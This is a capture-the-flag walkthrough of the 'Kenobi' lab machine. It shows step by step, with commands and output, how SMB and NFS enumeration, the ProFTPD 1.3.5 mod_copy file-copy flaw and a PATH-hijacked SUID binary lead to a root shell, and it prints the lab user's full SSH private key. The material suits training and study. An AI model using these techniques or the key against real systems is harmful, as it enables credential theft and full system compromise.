![[Pasted image 20230430054913.png]]

# Deploy the vulnerable machine

![](https://i.imgur.com/OcA2KrK.gif)

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

## Answer the questions below

### Make sure you're connected to our network and deploy the machine
### Scan the machine with nmap, how many ports are open?
7
```bash
┌──(root㉿kali)-[~]
└─# nmap -sCV -Pn 10.10.185.64
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 04:22 UTC
Nmap scan report for ip-10-10-185-64.eu-west-1.compute.internal (10.10.185.64)
Host is up (0.0075s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      45608/udp6  mountd
|   100005  1,2,3      47691/tcp6  mountd
|   100005  1,2,3      58031/tcp   mountd
|   100005  1,2,3      59326/udp   mountd
|   100021  1,3,4      33921/tcp   nlockmgr
|   100021  1,3,4      34164/udp6  nlockmgr
|   100021  1,3,4      34893/tcp6  nlockmgr
|   100021  1,3,4      60915/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:C0:6F:FC:04:E5 (Unknown)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-01T04:22:37
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-04-30T23:22:38-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```

http://10.10.185.64
![[Pasted image 20230430232843.png]]

```bash
sudo apt install gobuster
sudo apt-get install seclists
gobuster dir -u <url> -w <wordlist.txt> -x <file_extensions>


┌──(root㉿kali)-[~]
└─# gobuster dir -u http://10.10.185.64 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.185.64
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/05/01 04:37:15 Starting gobuster in directory enumeration mode
===============================================================
Progress: 83370 / 87665 (95.10%)===============================================================
2023/05/01 04:37:24 Finished
===============================================================

```

----------------------------------------------------

# Enumerating Samba for shares

![](https://i.imgur.com/O8S93Kr.png)

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

## Answer the questions below

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
```
SMB has two ports, 445 and 139.

![](https://i.imgur.com/bkgVNy3.png)

### Using the nmap command above, how many shares have been found?

```bash
┌──(root㉿kali)-[~]
└─# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.185.64
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 04:38 UTC
Nmap scan report for ip-10-10-185-64.eu-west-1.compute.internal (10.10.185.64)
Host is up (0.00018s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:C0:6F:FC:04:E5 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.185.64\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.185.64\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.185.64\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.
```bash
smbclient //MACHINE_IP/anonymous
```

Using your machine, connect to the machines network share.

![](https://i.imgur.com/B1FXBt8.png)

### Once you're connected, list the files on the share. What is the file can you see?
log.txt

```bash
──(root㉿kali)-[~]
└─# smbclient //10.10.185.64/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 10:49:09 2019
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019

                9204224 blocks of size 1024. 6867780 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (5974.8 KiloBytes/sec) (average 5975.1 KiloBytes/sec)
smb: \> 
```

```bash
┌──(root㉿kali)-[~]
└─# cat log.txt
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Dont use IPv6 support by default.
UseIPv6                         off

< -- SNIP -- >

# Set the user and group under which the server will run.
User                            kenobi
Group                           kenobi

< -- SNIP -- >

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User                          ftp
  Group                         ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias                     anonymous ftp

# For Unix password sync to work on a Debian GNU/Linux system, the following
# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
# sending the correct chat script for the passwd program in Debian Sarge).
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

< -- SNIP -- >

# This boolean controls whether PAM will be used for password changes
# when requested by an SMB client instead of the program listed in
# 'passwd program'. The default is 'no'.
   pam password change = yes

< -- SNIP -- >

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes
```

You can recursively download the SMB share too. Submit the username and password as nothing.

```bash
smbget -R smb://MACHINE_IP/anonymous
```

Open the file on the share. There is a few interesting things found.

-   Information generated for Kenobi when generating an SSH key for the user
-   Information about the ProFTPD server.

### What port is FTP running on?
21

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP

```bash
──(root㉿kali)-[~]
└─# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.185.64
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 06:33 UTC
Nmap scan report for ip-10-10-185-64.eu-west-1.compute.internal (10.10.185.64)
Host is up (0.00018s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1845860.0  6867768.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
MAC Address: 02:C0:6F:FC:04:E5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

### What mount can we see?
/var


------------------------------------

# Gain initial access with ProFtpd

![](https://i.imgur.com/L54MBzX.png)

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

Answer the questions below

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

### What is the version?
1.3.5

```bash
nc 10.10.185.64 21

┌──(root㉿kali)-[~]
└─# nc 10.10.185.64 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.185.64]

500 Invalid command: try being more creative
dir
500 DIR not understood
^C

```

We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

### How many exploits are there for the ProFTPd running?
searchsploit proftpd 1.3.5

```bash
┌──(root㉿kali)-[~]
└─# searchsploit proftpd 1.3.5
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                           | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                 | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                             | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                           | linux/remote/36742.txt
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html). 

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

![](https://i.imgur.com/LajBhh2.png)  

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

```bash
┌──(root㉿kali)-[~]
└─# nc 10.10.185.64 21                 
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.185.64]
SITE CPFR /home/kenobi/.shh/id_rsa
550 /home/kenobi/.shh/id_rsa: No such file or directory
SITE CPTO /var/tmp/id_rsa
503 Bad sequence of commands
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
421 Login timeout (300 seconds): closing control connection
```

```bash
┌──(root㉿kali)-[~]
└─# nc 10.10.185.64 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.185.64]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /home/kenobi/share/id_rsa
250 Copy successful
QUIT
221 Goodbye.

┌──(root㉿kali)-[~]
└─# smbclient //10.10.185.64/anonymous                           
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May  1 07:07:15 2023
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  id_rsa                              N     1675  Mon May  1 07:07:15 2023
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019

                9204224 blocks of size 1024. 6867760 blocks available
smb: \> get id_rsa
getting file \id_rsa of size 1675 as id_rsa (817.8 KiloBytes/sec) (average 817.9 KiloBytes/sec)
smb: \> 

```

Lets mount the /var/tmp directory to our machine

mkdir /mnt/kenobiNFS  
mount MACHINE_IP:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS

![](https://i.imgur.com/v8Ln4fu.png)

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----

```


![](https://i.imgur.com/Vy4KkEl.png)

### What is Kenobi's user flag (/home/kenobi/user.txt)?

```bash
┌──(root㉿kali)-[~]
└─# nc 10.10.185.64 21                
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.185.64]
SITE CPFR /home/kenobi/user.txt
350 File or directory exists, ready for destination name
SITE CPTO /home/kenobi/share/user.txt
250 Copy successful
QUIT
221 Goodbye.

┌──(root㉿kali)-[~]
└─# smbclient //10.10.185.64/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May  1 07:15:48 2023
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  user.txt                            N       33  Mon May  1 07:15:48 2023
  id_rsa                              N     1675  Mon May  1 07:07:15 2023
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019

                9204224 blocks of size 1024. 6867756 blocks available
smb: \> get user.txt
getting file \user.txt of size 33 as user.txt (16.1 KiloBytes/sec) (average 16.1 KiloBytes/sec)
smb: \> exit
```

```bash
cat user.txt
****************************
```


--------------------------------------------


# Privilege Escalation with Path Variable Manipulation

![](https://i.imgur.com/LN2uOCJ.png)  

Lets first understand what what SUID, SGID and Sticky Bits are.

SUID Bit
- User executes the file with permissions of the _file_ owner
SGID Bit
- User executes the file with the permission of the _group_ owner.  
- File created in directory gets the same group owner.
Sticky Bit
- No meaning
- Users are prevented from deleting files from other users.

```bash
┌──(root㉿kali)-[~/.ssh]
└─# chmod 600 kenobi_id_rsa 

┌──(root㉿kali)-[~/.ssh]
└─# ls -al
total 20
drwx------  2 root root 4096 May  1 07:43 .
drwx------ 20 root root 4096 May  1 07:22 ..
-rw-------  1 root root 1105 May  1 07:22 authorized_keys
-rw-------  1 root root 1676 May  1 07:35 kenobi_id_rsa
-rw-r--r--  1 root root  142 May  1 07:43 known_hosts

┌──(root㉿kali)-[~/.ssh]
└─# ssh -i kenobi_id_rsa kenobi@10.10.48.99
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ whoami
kenobi

```

## Answer the questions below

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: 
```bash
find / -perm -u=s -type f 2>/dev/null
```


### What file looks particularly out of the ordinary? 

 Submit


### Run the binary, how many options appear?

```bash
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$ 
```
/usr/bin/menu

```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Mon, 01 May 2023 07:53:55 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:1a:03:b0:2e:19  
          inet addr:10.10.48.99  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::1a:3ff:feb0:2e19/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:428 errors:0 dropped:0 overruns:0 frame:0
          TX packets:648 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:31961 (31.9 KB)  TX bytes:72765 (72.7 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:186 errors:0 dropped:0 overruns:0 frame:0
          TX packets:186 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:13861 (13.8 KB)  TX bytes:13861 (13.8 KB)

```

Strings is a command on Linux that looks for human readable strings on a binary.

![](https://i.imgur.com/toHFALv.png)

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

![](https://i.imgur.com/OfMkDhW.png)

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

### What is the root flag (/root/root.txt)?

```bash
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice

<REDACTERD>

.data
.bss
.comment

kenobi@kenobi:~$ echo /bin/sh > curl
kenobi@kenobi:~$ chmod 777 curl
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# pwd
/home/kenobi
# cd /root
# ls
root.txt
# cat root.txt
**********************************
```
